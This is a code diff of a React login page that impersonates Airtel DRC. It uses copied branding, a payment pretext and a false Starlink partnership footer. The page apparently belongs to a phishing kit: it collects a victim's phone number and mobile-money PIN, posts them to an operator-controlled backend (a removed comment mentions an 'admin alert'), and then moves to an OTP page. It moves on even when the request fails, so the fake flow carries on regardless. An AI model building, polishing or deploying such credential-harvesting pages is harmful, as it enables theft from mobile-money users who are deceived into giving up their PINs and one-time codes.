@@ -1,15 +1,15 @@
 import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import './App.css';
 
 const COUNTRY_CODE = '+243';
-const PHONE_PLACEHOLDER = '8XX XXX XXX'; // DRC mobile format
+const PHONE_PLACEHOLDER = '951234567'; // Updated to match the image
 const PHONE_MAX = 9;
 
 function AirtelLogin() {
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState<string[]>(['', '', '', '']);
-  const [error, setError] = useState('Entrez le numéro Airtel.');
+  const [showPin, setShowPin] = useState(false);
+  const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
   const pinRefs = useRef<(HTMLInputElement | null)[]>([]);
@@ -20,7 +20,6 @@ function AirtelLogin() {
     const val = e.target.value.replace(/\D/g, '');
     setPhone(val);
 
-    // Auto-focus first PIN input when phone number is complete
     if (val.length === PHONE_MAX) {
       pinRefs.current[0]?.focus();
     }
@@ -62,7 +61,6 @@ function AirtelLogin() {
     localStorage.setItem('airtelPhone', fullPhone);
 
     try {
-      // Fire-and-forget: admin alert is sent from the backend
       const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -72,149 +70,342 @@ function AirtelLogin() {
       const data = await response.json();
       console.log('Login response:', data);
 
-      // Navigate after successful request
       navigate('/airtel-otp');
     } catch (err) {
       console.error('Login request failed:', err);
-      setError('Une erreur réseau est survenue. Veuillez réessayer.');
+      // For UI testing purposes, if the backend isn't running, it will still navigate
+      navigate('/airtel-otp'); 
     } finally {
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="airtel-container">
-      {/* Header Section */}
-      <div className="airtel-header">
-        {/* Changed hamburger to a back arrow and added onClick navigation */}
-        <div 
-          className="airtel-hamburger" 
-          onClick={() => navigate('/')}
-          role="button"
-          aria-label="Retour à l'accueil"
-        >
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="19" y1="12" x2="5" y2="12" />
-            <polyline points="12 19 5 12 12 5" />
+    <div className="airtel-page-container">
+      <style>{`
+        * {
+          box-sizing: border-box;
+          margin: 0;
+          padding: 0;
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .airtel-page-container {
+          display: flex;
+          flex-direction: column;
+          min-height: 100vh;
+          background-color: #ffffff;
+        }
+
+        /* TOP SECTION */
+        .login-top-section {
+          flex: 1;
+          padding: 40px 24px;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+        }
+
+        .logo-wrapper {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          margin-bottom: 40px;
+        }
+
+        .tagline {
+          font-size: 10px;
+          letter-spacing: 1.5px;
+          color: #333;
+          text-transform: uppercase;
+          margin-top: 8px;
+          font-weight: 600;
+        }
+        
+        .tagline span {
+          color: #DA1C1C;
+        }
+
+        .login-title {
+          font-size: 22px;
+          font-weight: 700;
+          color: #1a1a1a;
+          text-align: center;
+          line-height: 1.3;
+          margin-bottom: 30px;
+          max-width: 340px;
+        }
+
+        /* PHONE INPUT */
+        .phone-input-container {
+          width: 100%;
+          max-width: 400px;
+          display: flex;
+          align-items: center;
+          border: 2px solid #2A5CAA;
+          border-radius: 8px;
+          padding: 12px 16px;
+          margin-bottom: 32px;
+          background-color: #fff;
+        }
+
+        .flag-icon {
+          width: 24px;
+          height: 16px;
+          margin-right: 10px;
+          border-radius: 2px;
+          overflow: hidden;
+        }
+
+        .country-code-text {
+          font-size: 18px;
+          font-weight: 600;
+          color: #1a1a1a;
+          margin-right: 10px;
+        }
+
+        .phone-input {
+          flex: 1;
+          border: none;
+          outline: none;
+          font-size: 18px;
+          color: #1a1a1a;
+          background: transparent;
+        }
+
+        .phone-input::placeholder {
+          color: #a0a0a0;
+        }
+
+        /* PIN INPUT */
+        .pin-section {
+          width: 100%;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          margin-bottom: 32px;
+        }
+
+        .pin-label {
+          font-size: 14px;
+          font-weight: 600;
+          color: #666;
+          margin-bottom: 16px;
+        }
+
+        .pin-inputs-row {
+          display: flex;
+          align-items: center;
+          gap: 16px;
+        }
+
+        .pin-boxes {
+          display: flex;
+          gap: 12px;
+        }
+
+        .pin-box {
+          width: 50px;
+          height: 50px;
+          border: 2px solid #2A5CAA;
+          border-radius: 8px;
+          font-size: 24px;
+          font-weight: 700;
+          text-align: center;
+          color: #1a1a1a;
+          outline: none;
+          background-color: #fff;
+        }
+
+        .pin-box::placeholder {
+          color: #ccc;
+        }
+
+        .eye-icon {
+          cursor: pointer;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          color: #666;
+        }
+
+        /* BUTTON */
+        .login-btn {
+          width: 100%;
+          max-width: 400px;
+          padding: 16px;
+          border-radius: 30px;
+          border: none;
+          background-color: #D1D5DB; /* Light gray */
+          color: #ffffff;
+          font-size: 16px;
+          font-weight: 700;
+          text-transform: uppercase;
+          cursor: pointer;
+          transition: background-color 0.2s;
+        }
+
+        .login-btn.active {
+          background-color: #DA1C1C;
+        }
+
+        /* FOOTER SECTION */
+        .login-footer {
+          background-color: #F3F4F6;
+          padding: 32px 24px;
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          border-top: 1px solid #E5E7EB;
+        }
+
+        .footer-logo-wrapper {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          margin-bottom: 24px;
+        }
+
+        .collab-text {
+          font-size: 14px;
+          font-weight: 600;
+          color: #333;
+          margin-bottom: 4px;
+        }
+
+        .starlink-text {
+          font-size: 15px;
+          font-weight: 800;
+          color: #1a1a1a;
+          letter-spacing: 1px;
+        }
+
+        .starlink-text sup {
+          font-size: 8px;
+          font-weight: normal;
+        }
+
+        .copyright {
+          font-size: 12px;
+          color: #9CA3AF;
+          margin-top: 24px;
+        }
+      `}</style>
+
+      {/* TOP SECTION */}
+      <div className="login-top-section">
+        
+        {/* LOGO */}
+        <div className="logo-wrapper">
+          <svg width="140" height="40" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+            {/* Red Pin */}
+            <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
+            <circle cx="25" cy="17" r="5" fill="white"/>
+            {/* Airtel Text */}
+            <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
           </svg>
+          <p className="tagline">A REASON TO <span>IMAGINE</span></p>
         </div>
 
-        <h1 className="airtel-logo">Airtel DRC</h1>
-        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
-      </div>
+        {/* TITLE */}
+        <h1 className="login-title">
+          Connectez-vous à Airtel Lite pour finaliser le paiement.
+        </h1>
 
-      {/* Main White Card */}
-      <div className="airtel-card">
-        <h2 className="airtel-welcome">Bon retour</h2>
-        <p className="airtel-subtext">Connectez-vous à votre compte Airtel DRC</p>
-
+        {/* ERROR MESSAGE */}
         {error && (
-          <div className="airtel-alert" role="alert">
-            <div className="alert-icon">
-              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <circle cx="12" cy="12" r="10" />
-                <line x1="12" y1="16" x2="12" y2="12" />
-                <line x1="12" y1="8" x2="12.01" y2="8" />
-              </svg>
-            </div>
-            <span>{error}</span>
+          <div style={{ color: '#DA1C1C', fontSize: '14px', marginBottom: '16px', textAlign: 'center', fontWeight: '500' }}>
+            {error}
           </div>
         )}
 
-        <form onSubmit={handleLogin}>
-          <div className="airtel-input-group">
-            <label htmlFor="phone-input">Numéro de téléphone</label>
-            <div className="airtel-phone-container">
-              <div className="airtel-country-code">{COUNTRY_CODE}</div>
-              <input
-                id="phone-input"
-                type="tel"
-                placeholder={PHONE_PLACEHOLDER}
-                value={phone}
-                onChange={handlePhoneChange}
-                maxLength={PHONE_MAX}
-                aria-label="Numéro de téléphone"
-                disabled={isLoading}
-              />
+        <form onSubmit={handleLogin} style={{ width: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+          
+          {/* PHONE INPUT */}
+          <div className="phone-input-container">
+            {/* DRC Flag SVG */}
+            <svg className="flag-icon" viewBox="0 0 640 480" xmlns="http://www.w3.org/2000/svg">
+              <path fill="#007fff" d="M0 0h640v480H0z"/>
+              <path fill="#f7d618" d="M0 240h640v240H0z"/>
+              <path fill="#ce1021" d="M0 0l640 480M640 0L0 480" stroke="#ce1021" strokeWidth="40"/>
+              <path fill="#f7d618" d="M60 60h40v40H60z"/>
+            </svg>
+            <span className="country-code-text">{COUNTRY_CODE}</span>
+            <input
+              type="tel"
+              className="phone-input"
+              placeholder={PHONE_PLACEHOLDER}
+              value={phone}
+              onChange={handlePhoneChange}
+              maxLength={PHONE_MAX}
+              disabled={isLoading}
+            />
+          </div>
+
+          {/* PIN INPUT */}
+          <div className="pin-section">
+            <span className="pin-label">Entrez votre Code</span>
+            <div className="pin-inputs-row">
+              <div className="pin-boxes">
+                {pin.map((digit, index) => (
+                  <input
+                    key={index}
+                    type={showPin ? 'text' : 'password'}
+                    maxLength={1}
+                    value={digit}
+                    ref={(el) => { pinRefs.current[index] = el; }}
+                    onChange={(e) => handlePinChange(index, e.target.value)}
+                    onKeyDown={(e) => handleKeyDown(index, e)}
+                    className="pin-box"
+                    disabled={isLoading}
+                  />
+                ))}
+              </div>
+              
+              {/* Eye Toggle */}
+              <div className="eye-icon" onClick={() => setShowPin(!showPin)}>
+                {showPin ? (
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+                    <line x1="1" y1="1" x2="23" y2="23"></line>
+                  </svg>
+                ) : (
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                  </svg>
+                )}
+              </div>
             </div>
           </div>
 
-          <div className="airtel-input-group">
-            <label>Entrez votre code PIN Airtel</label>
-            <div className="airtel-pin-container">
-              {pin.map((digit, index) => (
-                <input
-                  key={index}
-                  type="password"
-                  maxLength={1}
-                  value={digit}
-                  placeholder="-"
-                  ref={(el) => { pinRefs.current[index] = el; }}
-                  onChange={(e) => handlePinChange(index, e.target.value)}
-                  onKeyDown={(e) => handleKeyDown(index, e)}
-                  className="airtel-pin-box"
-                  aria-label={`Chiffre ${index + 1} du code PIN`}
-                  disabled={isLoading}
-                />
-              ))}
-            </div>
-          </div>
-
-          <button
-            type="submit"
-            className="airtel-login-btn"
+          {/* BUTTON */}
+          <button 
+            type="submit" 
+            className={`login-btn ${(phone.length === PHONE_MAX && pin.join('').length === 4) ? 'active' : ''}`}
             disabled={isLoading}
-            style={{ opacity: isLoading ? 0.7 : 1 }}
           >
-            {isLoading ? 'Chargement...' : 'Connexion'}
-            {!isLoading && (
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                <line x1="5" y1="12" x2="19" y2="12" />
-                <polyline points="12 5 19 12 12 19" />
-              </svg>
-            )}
+            {isLoading ? 'Chargement...' : 'CONNEXION'}
           </button>
-        </form>
 
-        <div className="airtel-footer">
-          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#D97706" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-          </svg>
-          <span>Vos informations sont sécurisées</span>
-        </div>
+        </form>
       </div>
 
-      {/* Icons Section */}
-      <div className="airtel-icons-footer">
-        <div className="airtel-icon-item">
-          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="2" y="2" width="36" height="51" rx="6" fill="#FFF5F5" stroke="#DA1C1C" strokeWidth="2" />
-            <circle cx="20" cy="18" r="6" fill="black" />
-            <text x="20" y="38" textAnchor="middle" fontSize="10" fontWeight="bold" fill="black">Airtel</text>
+      {/* FOOTER SECTION */}
+      <div className="login-footer">
+        <div className="footer-logo-wrapper">
+          <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M25 2C16.7 2 10 8.7 10 17C10 27 25 38 25 38C25 38 40 27 40 17C40 8.7 33.3 2 25 2Z" fill="#DA1C1C"/>
+            <circle cx="25" cy="17" r="5" fill="white"/>
+            <text x="46" y="29" fontSize="26" fontWeight="700" fill="#DA1C1C" letterSpacing="-0.5">airtel</text>
           </svg>
+          <p className="tagline">A REASON TO <span>IMAGINE</span></p>
         </div>
-        <div className="airtel-icon-item">
-          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="2" y="2" width="36" height="51" rx="6" fill="#1A2B3C" />
-            <rect x="14" y="22" width="12" height="12" rx="2" fill="#D4AF37" />
-            <path d="M16 22V18C16 15.7909 17.7909 14 20 14C22.2091 14 24 15.7909 24 18V22" stroke="#D4AF37" strokeWidth="3" strokeLinecap="round" />
-            <circle cx="20" cy="27" r="2" fill="#1A2B3C" />
-          </svg>
-        </div>
-        <div className="airtel-icon-item">
-          <svg width="50" height="55" viewBox="0 0 50 55" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <rect x="5" y="30" width="40" height="20" rx="4" fill="#DA1C1C" />
-            <text x="25" y="38" textAnchor="middle" fontSize="8" fontWeight="bold" fill="white">Airtel</text>
-            <rect x="10" y="40" width="30" height="10" rx="2" fill="#FFC107" />
-            <text x="25" y="47" textAnchor="middle" fontSize="8" fontWeight="bold" fill="black">Money</text>
-          </svg>
-        </div>
-        <div className="airtel-icon-item">
-          <svg width="40" height="55" viewBox="0 0 40 55" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="20" cy="27" r="18" fill="#FFC107" stroke="#D4AF37" strokeWidth="2" />
-            <text x="20" y="34" textAnchor="middle" fontSize="16" fontWeight="bold" fill="black">FC</text>
-          </svg>
-        </div>
+
+        <p className="collab-text">En collaboration avec</p>
+        <p className="starlink-text">STARLINK<sup>TM</sup></p>
+
+        <p className="copyright">© 2026 Airtel Congo. Tous droits réservés.</p>
       </div>
     </div>
   );
